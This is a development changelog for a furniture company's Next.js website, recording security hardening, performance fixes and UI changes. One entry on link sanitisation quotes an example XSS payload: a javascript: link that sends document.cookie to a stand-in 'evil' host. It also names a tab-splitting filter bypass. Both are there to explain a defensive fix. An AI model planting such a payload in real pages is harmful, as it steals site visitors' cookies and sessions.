# Changelog

What changed and why. Newest first. The format is defined in `AGENTS.md`;
every agent and developer adds an entry for anything that alters behaviour,
output, build steps or deploy steps.

The "Watch" lines are the point of this file: they are what a later change can
break by not knowing.

## Unreleased

### Fix silent data loss, restart-reset rate limiting, and unhardened webhooks (AUDIT_REPORT_2026-09-14.md)
- **What** Six confirmed-high findings from a security/QA audit, independently re-verified against the code before fixing:
  1. **Race condition on concurrent JSON writes** (`src/lib/reviews.ts`, `src/lib/articles.ts`) - `savePublicReview`, `saveArticle`, `toggleArticleStatus`, and `deleteArticle` all read-modified-wrote their JSON file without any serialization; two requests landing close together could each read the same array and the second write silently erased the first's change. Added `src/lib/file-lock.ts`, an in-process promise-chain queue keyed by file path, and wrapped all four functions in it. Reproduced the bug in isolation first (5 concurrent writes → 4 of 5 lost) and confirmed the fix (5 concurrent writes → all 5 present) before shipping it.
  2. **Login rate limiter reset by every restart** (`src/lib/rate-limiter.ts`) - counters lived only in an in-memory `Map`, so a redeploy or crash handed an attacker a fresh 3 attempts. Now persisted to `src/data/.rate-limit-state.json` (gitignored - runtime security bookkeeping, not content), loaded on module init and written back with a 50ms debounce on every change. Verified end to end: seeded 2 prior failures, restarted the dev server, and confirmed one more failed attempt correctly triggered the lockout - proving the state survives a restart.
  3. **Webhook fetches had no HTTPS enforcement, no timeout, no retry, and no way for a receiver to authenticate the sender** (`src/lib/email.ts`'s review-notification forward, `src/app/actions/submit-survey.ts`'s lead forward). Added `src/lib/webhook.ts` (`postToWebhook`): rejects non-`https://` URLs outright, adds an 8s timeout via `AbortController`, retries twice with backoff, and signs the body with HMAC-SHA256 (`X-Niscala-Signature`) when the new optional `LEAD_WEBHOOK_SECRET` env var is set. Both call sites now use it in place of a bare `fetch`.
  4. **Image loader silently served full-size originals when a responsive variant was missing** (`src/lib/image-loader.ts`) - `variantUrl()` returning `null` fell back to `src` with zero visibility, so a build that shipped without `npm run prepare:variants` completing only showed up once someone measured page weight. Added a `console.warn` on that fallback path.
- **Why** `AUDIT_REPORT_2026-09-14.md` (21-agent multi-phase audit); asked to fix the confirmed findings. The report itself already separated verified findings from false positives (committed secrets, path traversal, and "arbitrary webhook endpoint" were all checked and are not real - `.env.local` is properly gitignored, the upload directory is hardcoded not user-controlled, and the webhook URL requires env-var compromise to abuse, which already implies the server is owned) - only the 6 items above needed code changes.
- **Watch** The file lock is an in-process queue, correct only because this app runs as a single Node process (Hostinger, no horizontal scaling per AGENTS.md) - a future move to multiple instances or serverless needs a real distributed lock (e.g. a database row), not this. Same reasoning applies to the rate limiter's file-based persistence. `LEAD_WEBHOOK_SECRET` is optional and additive - an unset value sends unsigned requests exactly as before, so existing webhook configurations keep working without any change on their end.

### Fix the desktop nav's active-page underline jumping from the bottom of the page on navigation
- **What** `src/components/layout/header-nav.tsx`'s active-page underline used to be one `motion.span` shared between nav buttons via a Framer Motion `layoutId`, so switching pages handed the transition to Motion's layout-projection system. That system also tries to compensate layout animations for the page scrolling underneath them while they run - and `SmoothScroll` (Lenis, `root` mode) smooth-scrolls the window back to the top over about a second on every route change. The header is `position: fixed` and never actually moves with page scroll, but Motion couldn't tell that, and folded that entire scroll distance into the FLIP - which is what read as the underline getting yanked from the bottom of the page up to the nav bar. Replaced it with a plain measured indicator: one shared `<span>` positioned via `getBoundingClientRect()` on the active link and driven by a CSS `transition` on `transform`/`width` instead of Motion's layout system, so there is no scroll-compensation term to get wrong. Also found and fixed a related timing gap while building this: the very first measurement after a route change occasionally read a `NaN` width before the browser had finished laying out the newly-active link; a second measurement one `requestAnimationFrame` later (plus a `Number.isFinite` guard before ever committing a value) closes it.
- **Why** User report that the underline visibly dragged from the bottom of the page to the nav bar when switching pages.
- **Watch** This nav no longer imports `motion/react` at all - if a future change reintroduces a Framer Motion `layout`/`layoutId` animation anywhere inside the fixed `Header`, re-check it against Lenis's scroll-during-navigation behavior specifically, since that combination is what caused this.

### Fix choppy/stuck scrolling on mobile: throttle the sticky CTA bar's scroll handler
- **What** `src/components/layout/sticky-mobile-cta.tsx` ran `getBoundingClientRect()` - which forces a synchronous layout - directly inside its raw `scroll` event handler, once per scroll event, with no throttling. A fling on mobile fires far more scroll events than there are animation frames to answer, so every one of those events forced a fresh layout pass, which is exactly what reads as scrolling "stuttering" or "getting stuck." Wrapped the handler in the same `schedule()` → `requestAnimationFrame` pattern already used correctly by `src/components/ui/before-after.tsx` and `src/components/sections/process-storytelling.tsx` - now at most one layout read per animation frame, however many scroll events land in between.
- **Why** User report of choppy scrolling that would suddenly freeze. Audited every scroll listener in `src/` (`grep -rn "addEventListener(.scroll.|useScroll"`); this was the only one reading layout without a `requestAnimationFrame` gate - the other raw listeners (`src/components/layout/header.tsx`) only read `window.scrollY`, which doesn't force layout, so they were never the cause.
- **Watch** Any new scroll listener that calls `getBoundingClientRect`, `offsetHeight`/`offsetTop`, or similar layout-reading APIs needs the same `schedule`/rAF gate - reading those directly in a scroll handler is what causes this class of jank, not the listener itself.

### Scroll the portfolio category filter instead of wrapping it; strengthen the hero glass button further
- **What** `src/components/portfolio/category-filter.tsx`'s 11 category pills wrapped into an uneven multi-row "staircase" on narrow screens (each row a different width depending on which labels happened to fit together). Changed the list from `flex-wrap` to a single horizontally-scrollable row (`overflow-x-auto`, scrollbar hidden via `[scrollbar-width:none]` + the Webkit equivalent, pills `shrink-0` with `whitespace-nowrap`). Also raised the hero's `outline-inverse` glass button (touched earlier in this file) from `backdrop-blur-lg` to `backdrop-blur-xl` and increased its fill opacity (`from-pure-white/20 to-pure-white/5` → `from-pure-white/30 to-pure-white/15`) - the first pass still read as too see-through against a busy photo.
- **Why** User feedback that the category filter looked messy wrapped, and that the glass button was still too transparent.
- **Watch** If more categories are added later and the pill row still feels cramped, that's expected - it's designed to scroll, not to fit everything visible at once.

### Turn the public review form into a modal, and deepen the hero's glass button + text depth
- **What** Three changes: (1) `src/components/forms/review-form.tsx`'s "Beri Ulasan / Saran" form no longer expands inline in the testimonials section - it now opens as a centered modal dialog, portaled to `document.body` (`createPortal`) with a backdrop, `Escape`-to-close, click-outside-to-close, and a body scroll lock. All fields, validation, and the submit action are unchanged. (2) While rewriting it, fixed another instance of the undefined `text-title-md` class (same bug class as the furniture-custom fix earlier in this file) and replaced it with the real `text-headline-sm` token. (3) Deepened the hero's existing `outline-inverse` button variant (`src/components/ui/button.tsx`) - already a deliberate glassmorphism treatment per its own long-standing code comment - with a top-to-bottom gradient fill, `backdrop-saturate-150`, and a second faint inset shadow, and added a soft `text-shadow` to the hero headline and lead paragraph (`src/components/sections/hero.tsx`) for extra legibility/depth over the busy background photo.
- **Why** User request to convert the review form to a modal and redesign it, followed by a request to add smooth text shadow and push the hero's secondary button toward a more pronounced "liquid glass" look.
- **Watch** The modal's overlay/panel entrance animation uses this project's own `animate-overlay-in`/`animate-menu-in` tokens (defined in `globals.css`), not `tailwindcss-animate`'s `animate-in`/`fade-in`/`zoom-in-*` classes - this project deliberately does not install that plugin (see the comment above `--animate-overlay-in` in `globals.css`), so those classes are silent no-ops here. `src/components/ui/image-lightbox.tsx` still uses the no-op `animate-in fade-in duration-200` from before this change; it wasn't touched since it wasn't part of what was asked, but it has the same latent bug.

### Redesign the survey section wrapper for conversion (form itself untouched)
- **What** Rebuilt `src/components/sections/survey.tsx` (the wrapper around `SurveyForm`, embedded on the homepage and on `/survey`) as a two-column layout: a persuasion column (sharper benefit-led headline, 3 objection-handling reassurances - free consultation, ~2 minute/4-step effort, WhatsApp hand-off - and a live proof strip pulling real `projectCount`/`servedLocations` numbers from `src/data/projects.ts`) beside the form card, which collapses to a single stacked column (pitch first, form second) on mobile. `src/components/forms/survey-form.tsx` was explicitly not touched - same 4 steps, same fields, same validation, same submit/WhatsApp hand-off logic.
- **Why** User request to make the form more inviting to fill out using marketing-funnel technique, with an explicit constraint not to change the form's structure.
- **Watch** The reassurance copy restates claims that already exist elsewhere on the site (free initial consultation, no hidden costs, WhatsApp response) rather than inventing new ones, and the proof strip is computed data, not a hardcoded number - keep it that way if this section is touched again, since `src/data/testimonials.ts` explicitly warns its quotes are placeholder/fabricated and must never be pulled in as real social proof.

### Convert the last 4 JPG source images to WebP
- **What** `public/images/problems/masalah-01.jpg` through `masalah-04.jpg` (the "Masalah 01-04" cards on the homepage, `src/components/sections/problems.tsx`) were the only non-WebP files left in `public/images/`. Re-encoded all 4 to WebP with the same settings `scripts/prepare-images.mjs` uses (quality 78, effort 5, 400KB cap), deleted the JPGs, updated the `image` paths in `src/data/content.ts` from `.jpg` to `.webp`, and reran `npm run prepare:variants` to regenerate their 6 responsive breakpoints in `public/v/`.
- **Why** `IMAGE_OPTIMIZATION_AUDIT.md` flagged these as the only remaining unoptimized source images (2.99 MB combined). The audit's own suggested fix (`npm run prepare:images`) would not have touched them — that script only regenerates `public/images/portfolio/` and `public/images/process/` from `BAHAN/BAHAN PORTOFOLIO`, and there is no `BAHAN/problems/` source directory for these at all, so they were converted directly instead. Actual size reduction beat the audit's estimate: 2.99 MB → 0.30 MB (90%, vs. the audited 60%).
- **Watch** The variant pipeline (`build-image-variants.mjs`) already re-encodes any `.jpg`/`.png` source it finds under `public/images/` into WebP variants regardless — so visitors were never actually downloading the raw 828KB JPGs; only the git-tracked *source* files were oversized. Don't read "X unoptimized source file" in a future audit as "visitors are downloading X unoptimized" without checking whether `public/v/` variants already cover it.

### Fix furniture-custom pages rendering without container/padding/type styles
- **What** `src/app/furniture-custom/page.tsx` and `src/app/furniture-custom/[slug]/page.tsx` referenced `container-site`, `section-padding`, `section-padding-sm`, `font-serif`, `text-title-lg`, `text-title-md`, and `shadow-card` — none of which are defined anywhere in `src/app/globals.css` or this Tailwind v4 CSS-first project (there is no `tailwind.config.*`). Tailwind silently drops unknown classes with no warning, so every section on both pages rendered with zero max-width container, zero horizontal gutter, and zero vertical section spacing on every breakpoint, not just desktop. Replaced every occurrence with the site's real, already-used tokens: `container-editorial` for the container, `py-space-3xl`/`py-space-4xl` for section padding (matching `services/page.tsx`, `portfolio/page.tsx`, `knowledge/page.tsx`), `text-headline-sm`/`text-headline-md` for headings, `shadow-hairline`/`shadow-panel` for elevation, and dropped `font-serif` (no serif font is registered; the type tokens already carry the right size). Also fixed `furniture-category-gallery.tsx`: card descriptions were `hidden sm:block`, completely removing real spec/description content on mobile (not just hiding it), and both the description and specs-footer text sat below the 12px floor `globals.css`'s own type-scale comment documents as the minimum for readable text — both now show on every breakpoint at `text-xs sm:text-body-sm`. Unified the `[slug]` page's "other categories" grid (`grid-cols-2 lg:grid-cols-4`, skipped `md`) with the gallery grid directly above it on the same page (`md:grid-cols-3`) for internal consistency.
- **Why** An automated layout audit (`FURNITURE_CUSTOM_LAYOUT_AUDIT_REPORT.md`) flagged the undefined `container-site`/`section-padding` classes as blocking desktop verification. Investigation found the actual scope was wider (7 undefined class names, all breakpoints affected, real content hidden from mobile users) and that the audit's own proposed fix — defining new `@utility container-site`/`section-padding` blocks — would have created a second parallel spacing system next to `container-editorial`/`py-space-*`, which every other page already uses.
- **Watch** The audit also recommended adding `md:grid-cols-3` to the advantages/workflow `sm:grid-cols-2 lg:grid-cols-4` grids and `xl:grid-cols-5 2xl:grid-cols-6` to the gallery grid — both were deliberately **not** applied: the skip-`md` grid pattern matches `about/page.tsx`'s stats grid elsewhere in the codebase, and this codebase has zero `xl:`/`2xl:` breakpoints anywhere because `container-editorial` caps content at 1440px, so a wider grid step wouldn't use any screen width the container doesn't already have. Don't reintroduce those "fixes" without checking precedent first. Separately, `services/page.tsx` and `services/[slug]/page.tsx` use `text-label-xs`/`text-body-xs`, which are also undefined in the type scale — same bug class, different pages, not touched here.

### Fix `npm run admin:password` reading an empty password on Windows
- **What** `scripts/admin-credentials.mjs`'s hidden-input prompt raced a manual `stdin.on("data", ...)` listener against `rl.question` to hide keystrokes. That only hides/accumulates correctly when the terminal delivers stdin byte-by-byte (raw mode); Windows consoles deliver one cooked line at Enter, so the listener never saw real keystrokes and `answer` came back empty, always failing the 12-character check. Replaced it with Node's documented technique of muting `rl._writeToOutput` instead of adding a second listener.
- **Why** A dev on Windows ran `npm run admin:password` to reset a forgotten admin password, typed a valid password, and got "Too short. Use at least 12 characters." every time.
- **Watch** If Node ever removes the internal `readline.Interface#_writeToOutput` hook, this needs a different muting approach (e.g. a custom `Writable` output stream).

### Added Furniture Custom main page and category dropdown with 20+ reference galleries, 2-column mobile layout, and interactive lightbox
- **What** Added "Furniture Custom" navigation link directly below "Portofolio" with a dropdown featuring 5 categories: Kitchen Set Custom, Lemari Custom, Lemari Bawah Tangga Custom, Backdrop TV Custom, and Furniture Kamar. Created a comprehensive hub page at `/furniture-custom` and 5 dynamic category galleries at `/furniture-custom/[slug]`, each loaded with at least 20 curated design references (116 total items). All galleries are laid out in responsive desktop grids and strictly 2 columns on mobile (`grid-cols-2`). Added an accessible, touch-friendly, full-screen interactive Lightbox modal (`ImageLightbox`) enabling visitors to enlarge every photo, navigate with arrows or swipe, view specifications, and consult directly via prefilled WhatsApp.
- **Why** User request to add "Furniture Custom" under "Portofolio" as a main page with a category dropdown of the 5 specific categories, populate each category with minimal 20 reference images matching each title, format the mobile layout as 2 columns, and make all photos enlargeable on click.
- **Watch** Image references in `src/data/custom-furniture.ts` map to optimized WebP imagery in `public/images/custom-furniture/` and `public/images/portfolio/` (all 116 references verified and audited to ensure 0 broken links). Routes are indexed in `src/app/sitemap.ts`.

### Ignored generated image variants directory in git
- **What** Added `/public/v/` to `.gitignore`.
- **Why** Image variants are generated locally and during deployment builds; tracking them caused repository bloat and binary merge conflicts.
- **Watch** Deployment environments must run the build step or upload the generated `public/v/` directory, as the site layout depends on these variants.

### Updated material section photos to match technical substrate and hardware specifications
- **What** Replaced the two general under-stair cabinet photos in `src/data/projects.ts` (`materialImages`) used by `src/components/sections/materials.tsx` with dedicated, authentic high-resolution photographs representing the actual technical specifications: one showing dense export-grade multipleks (plywood) layers, green moisture-resistant HMR core, and clean ABS machine edging, and one showing a premium stainless steel slow-motion hydraulic soft-close hinge and undermount soft-close drawer slide.
- **Why** User request to replace the two mismatched under-stair cabinet images with imagery directly depicting the materials described (Plywood/HMR, HPL/Duco, slow-motion hinges, and ABS machine edging).
- **Watch** Images are stored at `public/images/materials/` in 3:4 aspect ratio WebP and render with Next.js responsive image sets.

### Limited related articles to 4 cards with visual thumbnails and "Panduan Lainnya" CTA button
- **What** Updated the "Panduan lainnya" section in `src/app/knowledge/[slug]/page.tsx` to display exactly 4 relevant articles with context-matched image thumbnails, 2-column mobile layout (`grid-cols-2 lg:grid-cols-4`), and a prominent "Panduan Lainnya" button linking to `/knowledge`. Also added image blocks to baseline articles in `src/data/custom-articles.json` and `src/data/knowledge.ts`.
- **Why** User request to show only 4 related guides with content-matched imagery and a "Panduan Lainnya" button below.
- **Watch** Thumbnail selection prioritizes image blocks in `article.body` and falls back gracefully to contextual portfolio photography.

### Added second wave of 9 problem-solution articles across all categories
- **What** Appended 9 more in-depth articles to `src/data/custom-articles.json` (one per category across Bandung, Cimahi, Bandung Barat, Jakarta, Tangerang, Bekasi, Finishing, Desain, and Tips), bringing total custom articles to 21, each with portfolio photography, technical problem/solution breakdowns, and WhatsApp CTAs.
- **Why** User request to add 9 additional articles across each category.
- **Watch** Total custom articles count is now 21; all automatically inherit the 4-card portfolio showcase and WhatsApp consultation funnels.

### Configured portfolio grids to 2 columns on mobile viewport
- **What** Updated the portfolio grid layout in `src/app/knowledge/[slug]/page.tsx`, `src/components/portfolio/project-grid.tsx`, and `src/app/portfolio/[slug]/page.tsx` to display 2 columns on mobile viewports (`grid-cols-2 gap-space-sm sm:gap-gutter-desktop`) with 50vw mobile image sizing.
- **Why** User request to use a 2-column layout on mobile for portfolio card areas.
- **Watch** `ProjectCard` typography and padding scale smoothly on small screens with `text-[10px]` and `p-space-xs`.

### Added 4 featured portfolio project cards with "Lihat Semua Portofolio" CTA under every article
- **What** Enhanced `src/app/knowledge/[slug]/page.tsx` with a dedicated portfolio showcase section displaying 4 contextually matched project cards (prioritizing category/location relevance) using `ProjectCard`, followed by a prominent call-to-action button linking to `/portfolio`.
- **Why** User request to showcase 4 real portfolio project cards under every article followed by a "Lihat Semua Portofolio" link.
- **Watch** Projects are dynamically matched against article category/location metadata and capped at exactly 4 items.

### Published comprehensive problem-solution articles across all categories with images and WhatsApp CTA
- **What** Added 9 rich editorial articles to `src/data/custom-articles.json` spanning all service area categories (Bandung, Cimahi, Bandung Barat, Jakarta, Tangerang, Bekasi) and general categories (Finishing & Perawatan, Desain & Tata Letak, Tips & Inspirasi), each featuring actual portfolio photography, detailed problem-solution breakdowns, and WhatsApp consultation CTAs.
- **Why** User request to populate articles across all categories explaining custom furniture with clear problems, solutions, relevant images, and WhatsApp consultation CTAs.
- **Watch** Articles automatically feed into `/services/[slug]` landing pages and `/knowledge` by matching category names.

### Transformed "Layanan" into "Layanan Area" category dropdown with dedicated area landing pages
- **What** Replaced the single "Layanan" navigation link with a "Layanan Area" dropdown containing 6 city areas (Bandung, Cimahi, Bandung Barat, Jakarta, Tangerang, Bekasi) in both desktop HeaderNav and mobile drawer menu, linked them to new dynamic landing pages at `/services/[slug]`, added service area categories to admin article editor presets, and added area routes to sitemap.
- **Why** User request to transform "Layanan" into a "Layanan Area" dropdown categorized by 6 service areas that developers can input and manage through articles.
- **Watch** Each area in `src/data/service-areas.ts` uses the exact category name (e.g., "Furniture Custom Bandung") matched by `getAllArticles()` filtering.

### Moved quick estimation survey form directly below hero
- **What** Repositioned the `<Survey />` section ("Rencanakan Ruangan Impian Anda") in `src/app/page.tsx` to sit immediately beneath `<Hero />` and directly above `<Problems />` ("Sebelum memilih furniture"), with vertical spacing tailored for the placement.
- **Why** Prioritizes the interactive 4-step consultation and estimation flow directly after the first screen fold.
- **Watch** `CtaBanner` now directly precedes `BehindTheScenes` and uses `reserveCurveSpace={true}` to prevent curve overlap.

### Added public review form with email capture and notification to info@niscalafurniture.com
- **What** Added an email address field to `ReviewForm` and `submitReviewAction`, configured automated email notifications to `info@niscalafurniture.com` via `src/lib/email.ts` (using nodemailer / SMTP / webhook fallback), and ensured the email is kept strictly private for developer/internal data by stripping it from public API and UI rendering.
- **Why** Enables the studio team to receive immediate email notifications of new public reviews and follow up directly with the submitter, while protecting client privacy.
- **Watch** Outgoing email requires SMTP variables in `.env.local` to deliver directly from server; without SMTP it logs safely and does not block review persistence.

### Set mobile hero background scrim opacity to 30%
- **What** Changed the mobile background overlay in `src/components/sections/hero.tsx` from `bg-deep-black/85` to `bg-deep-black/30`.
- **Why** Adjusted overlay balance between photograph visibility and white text contrast.
- **Watch** Keep an eye on text legibility against brighter photographs.

### Production admin panel had never worked - env vars were never set, and the `\$` escaping fix is Hostinger-specific
- **What** No code change. Documenting two things found while bringing up the
  admin panel on the live Hostinger deployment for the first time: (1)
  `ADMIN_USERNAME` / `ADMIN_SECRET` / `ADMIN_PASSWORD_HASH` had never been set
  in production at all - only `NEXT_PUBLIC_*` variables existed in Hostinger's
  "Variabel Environment" panel, so `/admin` had been fully disabled (fail
  closed, per design) since the site went live on 2026-09-08. (2) Once those
  three were added, login still failed with the same generic "belum
  dikonfigurasi" message until the `\$`-escaped form of `ADMIN_PASSWORD_HASH`
  was replaced with the plain, unescaped `$` version.
- **Why** The `\$` escaping documented earlier in this file (see "`npm run
  admin:password` now prints a pre-escaped hash") is correct for
  `.env.local`, because `@next/env` parses that file itself and
  reinterprets unescaped `$word` as a variable reference. Hostinger's
  "Variabel Environment" panel does not go through that file-parsing path -
  it injects values directly into the process's environment, so `@next/env`'s
  interpolation step never runs on them. The backslashes weren't neutral:
  they were stored as literal characters in the value, which corrupted every
  field of the hash (`stored.split("$")` no longer split where the real
  value's `$`s are) and produced the same generic `AdminConfigError` message
  as a missing variable, making the two failure modes indistinguishable from
  the login screen alone. Confirmed by removing the backslashes and
  redeploying: login succeeded immediately after.
- **Watch** Whether a value needs `\$` escaping depends entirely on *how* the
  target platform delivers environment variables to the process - not on the
  value itself. A file-based `.env`/`.env.local` loaded by `@next/env` needs
  it; a platform that injects `process.env` directly (this Hostinger Node.js
  app panel, and likely most container/PaaS-style env var UIs) needs the
  plain, unescaped value. Check which kind a new deployment target is before
  reusing the escaped form from `npm run admin:password`'s output verbatim.

### Cover images now go through the image pipeline, not a flat full-size `<img>`
- **What** New `CoverImage` component (`src/components/ui/cover-image.tsx`)
  looks up `article.coverImage` in `publishedImageSizes` (the same map the
  in-body image block already uses) and renders `next/image` with `fill` and
  a real `sizes` attribute when the path is one the build pipeline published;
  only a genuine admin upload or pasted external URL - which has no known
  dimensions - falls back to a plain `<img>`. Wired into all four places a
  cover image renders: the `/knowledge` grid, the homepage preview cards, the
  article hero, and the sidebar's 80px thumbnails.
- **Why** Every cover image added this session happens to be a real portfolio
  or process photo already in `public/images` with pre-built `public/v`
  variants - but the first pass rendered all of them as plain `<img src>`
  regardless, serving the full 1600px file everywhere a cover image appears,
  including an 80px sidebar thumbnail. Confirmed the fix: the sidebar
  thumbnail's `srcset` now offers 256w-1600w and its `sizes="80px"` picks the
  256w variant instead of downloading the 1600px original six times per
  article page (three sidebar items, duplicated for the responsive layout).
- **Watch** `CoverImage` requires a `position: relative` ancestor with a
  defined size (an `aspect-*` wrapper) - it renders with `fill` on the
  pipeline path, which needs a sized, positioned parent to fill. The plain
  `<img>` fallback still exists and is still correct for uploads: don't
  remove it to "simplify" the component, or a real admin upload with no
  pipeline variant will break.

### Stopped animating `box-shadow` on the knowledge card hover-lift
- **What** `knowledge-preview.tsx` and `knowledge-search-grid.tsx` both had
  `transition-all` on the card `<Link>`, which also has `hover:shadow-panel`
  (a two-layer, 32px-blur box-shadow). Scoped the transition to
  `transition-transform` instead - the card still lifts (`-translate-y-1`)
  with an eased transition, but the shadow now snaps instantly on hover
  rather than animating.
- **Why** Reported as the site feeling noticeably heavier while scrolling.
  `transition-all` makes the browser watch every animatable property, and
  animating `box-shadow` specifically forces a full repaint of an area larger
  than the element (the blur radius), every frame, for as long as the hover
  state and the 300ms transition overlap - which is exactly what happens when
  a visitor scrolls with a wheel while the cursor rests over a card. The
  project's own `project-card.tsx` already scopes its hover transition to
  `transition-transform` for this reason; these two cards just didn't follow
  it.
- **Watch** An instantly-snapping shadow on hover is the intended trade-off,
  not a bug - don't "fix" it by adding the shadow back into a broad
  transition. If a card ever needs an animated shadow specifically, the cheap
  way is a separate absolutely-positioned shadow layer whose *opacity*
  crossfades (compositor-only), not animating `box-shadow` directly.

### Login rate limiter now also keys on username, not just the spoofable client IP
- **What** `src/lib/rate-limiter.ts` runs two independent limiters instead of
  one: the existing per-IP counter, plus a new per-username counter.
  `loginAdminAction` checks and records failures against both, and only
  resets both together on a real login.
- **Why** `extractClientIp()` (in `auth.ts`) reads `X-Forwarded-For`, which is
  entirely client-supplied and unverified - the code already says as much in
  a comment there. A login attempt with a different fake IP on every request
  got a fresh 3-attempt allowance each time, so the "3 tries then 10-minute
  block" promised on the login screen never actually engaged. Verified with
  an isolated script: the IP-only limiter stayed at "2 remaining" across five
  distinct fake IPs in a row, while the new username limiter correctly
  blocked on the third attempt and stayed blocked - independent of what IP is
  claimed, since it never reads one.
- **Watch** The username key is lower-cased and trimmed before lookup, so
  "admin", "Admin" and "ADMIN" all share one counter - don't key it on the raw
  input, or that normalization (and the protection) is gone. The login page's
  copy used to say the *IP* would be blocked; it now says *access* is
  blocked, since blocking is no longer only IP-scoped.

### Article body links now go through a scheme allow-list before becoming `<a href>`
- **What** Added `isSafeHref()` to `src/lib/article-utils.ts`, allowing only
  `http:`, `https:`, `mailto:`, `tel:`, and scheme-less relative paths
  (`/...`, `#...`). Applied it in `FormattedText` (renders article bodies on
  the public site) and in the admin markdown editor's live-preview link
  rendering, which had the identical unguarded pattern.
- **Why** `[text](url)` parsing took the URL straight from the markdown with
  no validation and rendered it into `<a href={url}>`.
  `[Klik di sini](javascript:fetch('https://evil/steal?c='+document.cookie))`,
  saved as ordinary article body text through the admin editor, published as
  a real clickable link on `/knowledge/[slug]` - it runs in the browser of
  whichever site visitor clicks it, not the account that wrote it. Built on
  the `URL` constructor rather than a regex: WHATWG's URL parser strips
  embedded tabs/newlines before reading the scheme, which closes the classic
  `jav\tascript:` bypass a naive string check would miss - verified against
  12 cases (6 safe, 6 malicious) including that one.
- **Watch** An unsafe href degrades the link to plain text (just the label, no
  `<a>`) rather than dropping it - a reader still sees the words. The two
  copies of this link-parsing logic (public renderer, admin preview) are still
  duplicated; if a third one is ever added, it needs the same `isSafeHref`
  guard, not a fresh regex.

### Guide articles gained cover images, shown in cards, the article hero, and structured data
- **What** `KnowledgeArticle` gained optional `coverImage` / `coverImageAlt`
  fields. The admin editor got an upload-or-paste-URL field (reusing the
  existing `uploadArticleImageAction` pipeline) with a live preview. The image
  now renders on the `/knowledge` grid, the homepage preview section, and as a
  hero image on the article page itself, plus feeds the `image` field of the
  Article JSON-LD when present.
- **Why** Every card was pure text - four identical-looking rectangles with no
  way to tell them apart at a glance. Filled in real photos from the existing
  portfolio (a survey/measurement shot, an open wardrobe, two kitchens)
  matched to what each article actually explains, rather than stock or
  placeholder images.
- **Watch** Rendered as a plain `<img>`, not `next/image`, everywhere -
  deliberately, matching how in-body images already handle admin uploads and
  pasted URLs: no pipeline variants exist for these, so `next/image` would
  just be a pass-through wrapper. Cards fall back to a text-only layout (no
  broken-image box) when `coverImage` is unset, which is still true for any
  article an admin creates without one.

### Knowledge cards redesigned: photo-first, category pill, and a `/knowledge` search + sidebar
- **What** Rebuilt the article cards on `/knowledge` and the homepage preview
  section (image on top when set, reading time, title with a hover-filling
  arrow badge, category pill + date footer) and extracted the `/knowledge`
  grid into a client component (`KnowledgeSearchGrid`) that filters by
  title/category/summary as you type. The homepage preview section now shows
  a "Lihat Semua Panduan" link once there are more than four articles. The
  article detail page (`/knowledge/[slug]`) is now a two-column layout with a
  sticky sidebar (`lg:sticky lg:top-24`) listing up to four other guides,
  replacing the old full-width "Panduan lainnya" block at the bottom of the
  page.
- **Why** Requested after the four-card homepage grid went to
  `lg:grid-cols-4`, which squeezed each card to ~340px and wrapped titles onto
  five lines. Search and the sidebar exist for the same reason the see-all
  link does: none of them mattered at four articles, all three start
  mattering the moment there are more.
- **Watch** Two rendering bugs surfaced and were fixed while building this,
  worth knowing if the cards are touched again: (1) the category+time header
  row needs `shrink-0 whitespace-nowrap` on the time badge, or a long category
  name pushes it onto two lines; (2) cards must sit on
  `bg-surface-container-lowest`, not `-container-low` - the latter is only six
  RGB points off the section's own `bg-surface` and the card boundary
  disappears. The sidebar caps at four other guides and only shows its own
  "Lihat Semua" link past that count - it is not meant to list everything.

### Fixed a cream seam between the public header's spacer and the admin panel
- **What** Moved the `pt-20` that clears the public site's fixed header from
  `<main>` in the root layout into `PageTransition`, which already reads the
  route via `usePathname()` and now skips the padding on `/admin/*` routes.
- **Why** `Header` already renders `null` on admin routes, but the root layout
  applied `pt-20` to `<main>` unconditionally regardless - the padding
  survived as a bare strip of the body's cream background sitting on top of
  the admin panel's own white surface, printing a hard seam right under the
  admin header.
- **Watch** `Header`, `Footer`, and `StickyMobileCta` already key their own
  visibility off this same `pathname.startsWith("/admin")` check - if a
  fourth piece of chrome needs the same admin exception, follow that pattern
  rather than inventing a new one.

### Redesigned the admin CMS shell, dashboard, and login screen
- **What** Reworked `admin/layout.tsx` (header, now a top-to-bottom
  `surface` → `surface-container-lowest` gradient instead of flat white), the
  articles dashboard (unified stat tiles with icon chips, a real segmented
  filter control, refined empty state), and the login page (icon-mark card,
  plus an autofill-color override in `globals.css` so saved-credential
  autofill doesn't paint fields the browser's own blue or yellow).
- **Why** The panel previously used ad-hoc inline styling that didn't match
  the token system the rest of the site (`--color-surface-container-*`,
  `--shadow-hairline`, etc.) already defines in `globals.css` - three
  disconnected stat boxes, a plain-border tab row, and a login card with no
  depth.
- **Watch** Deliberately did **not** adopt generic frontend-skill defaults
  (Geist/zinc palette, phosphor icons, spring-physics motion) here - this
  project already has its own single-accent "Warm Architectural Editorial"
  system and a documented preference for CSS-only motion over JS-driven
  animation (see `reveal.tsx`). Match that system on any further admin work
  rather than reaching for generic conventions.

### `npm run admin:password` now prints a pre-escaped hash
- **What** `scripts/admin-credentials.mjs` escapes every `$` in the scrypt
  hash as `\$` before printing it, so the line you paste into `.env.local`
  (`ADMIN_PASSWORD_HASH=scrypt\$32768\$8\$1\$<salt>\$<key>`) is already safe.
- **Why** Next.js's env loader (`@next/env`) interpolates unescaped `$word` as
  a reference to another env var, same as shell parameter expansion. Segments
  like `$32768` or `$1` in the raw hash (`scrypt$N$r$p$salt$key`) matched that
  pattern, resolved to nothing, and silently gutted the stored hash. Login then
  failed with the generic "ADMIN_PASSWORD_HASH is malformed" from
  `src/lib/auth.ts`, which reads like a bad password, not a parsing bug -
  there was no hint anywhere that `.env.local` values needed escaping.
- **Watch** The same interpolation risk applies to any future env value that
  contains a literal `$` (a different hash format, anything with its own
  `$`-delimited fields) - escape it the same way if it's ever hand-typed
  rather than generated by this script. **This escaping is specific to
  file-based `.env`/`.env.local` loading, though** - see "Production admin
  panel had never worked" further up this file. A platform that injects
  environment variables directly into the process (Hostinger's "Variabel
  Environment" panel, most container/PaaS UIs) never runs `@next/env`'s
  interpolation step on them, so the same escaped output breaks the hash
  there instead of protecting it.

### A runnable migration prompt for the second developer's agent
- **What** `SYNC-AGENT.md`: step-by-step instructions an AI agent executes to
  move Developer B's clone onto this repository, with a proof step before the
  switch and guardrails against force-pushing or committing secrets.
- **Why** `CONTRIBUTING.md` explains the workflow to a person; this is written
  to be run. The steps are ordered so nothing is discarded before it is proven
  to exist on `master`.
- **Watch** It describes `master`, not the open `feat/optimasi-gambar` branch.
